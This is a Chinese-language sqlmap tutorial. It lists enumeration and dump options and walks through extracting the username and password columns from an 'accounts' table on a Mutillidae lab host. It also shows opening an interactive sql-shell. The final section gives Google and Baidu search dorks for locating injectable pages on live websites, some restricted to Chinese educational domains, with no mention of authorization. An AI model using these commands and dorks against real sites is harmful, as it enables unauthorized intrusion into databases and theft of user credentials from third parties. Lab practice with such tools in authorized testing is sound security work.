# 一、sqlmap简介
SQLmap是一个国内外著名的安全稳定性测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的安全稳定性测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。

SQLmap支持Mysql，Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Access，IBM DB2,SQLite，等数据库的各种安全漏洞检测。

## 1.1 sqlmap 参数解析
```
--users       # 查看所有用户
--current-user   # 查看当用户
--dbs         # 查看所有数据库
--current-db   # 查看当前数据库
-D “database_name” --tables  # 查看表
-D “database_name” -T “table_name” --columns  # 查看表的列

--dump -all
--dump-all --exclude-sysdbs
-D “database_name” -T “table_name” --dump
-D “database_name” -T “table_name” -C “username,password” --dump

--batch  # 自动化完成
```

# 二、sqlmap自动化注入
 - GET方法注入
 - Post方式注入
 - 数据获取
 - 提权操作

## 2.4 提权操作
与数据库交互--sql-shell
```bash
sqlmap -u “http://192.168.xxx.xxx/test/?id=1” --cookie=”SESSIONID=xxxxxx;security=low;showhints=1”; acopendivids=swingset,jotto;acgroupswithpersist=nada” --batch --sql-shell

# 进入到了sql-shell命令行方式
sql-shell> select * from users;
```

## 示例步骤：
### 1.获得当前数据库
```bash
sqlmap -u “http://192.168.xx.xx/mutillidae/index.php?page=user-info.php&username=test&password=123&user-info-php-submit-button=View+Account+Details” --batch --current-db
```

### 2.获得数据库表
```bash
sqlmap -u “http://192.168.xx.xx/mutillidae/index.php?page=user-info.php&username=test&password=123&user-info-php-submit-button=View+Account+Details” --batch -D database --tables
```

### 3.获得表的字段
```bash
sqlmap -u “http://192.168.xx.xx/mutillidae/index.php?page=user-info.php&username=test&password=123&user-info-php-submit-button=View+Account+Details” --batch -D database -T accounts --columns
```

### 4.获得表中的数据
```bash
sqlmap -u “http://192.168.xx.xx/mutillidae/index.php?page=user-info.php&username=test&password=123&user-info-php-submit-button=View+Account+Details” --batch -D database -T accounts -C "username,password" --dump
```

## 综合示例
### 1.通过google搜索可能存在注入的页面
```
inurl:.php?id=
inurl:.jsp?id=
inurl:.asp?id=
inurl:/admin/login.php
inurl:.php?id= intitle:美女
```
### 2.通过百度搜索可能存在注入的页面
```
inurl:news.asp?id= site:edu.cn
inurl:news.php?id= site:edu.cn
inurl:news.aspx?id= site:edu.cn
```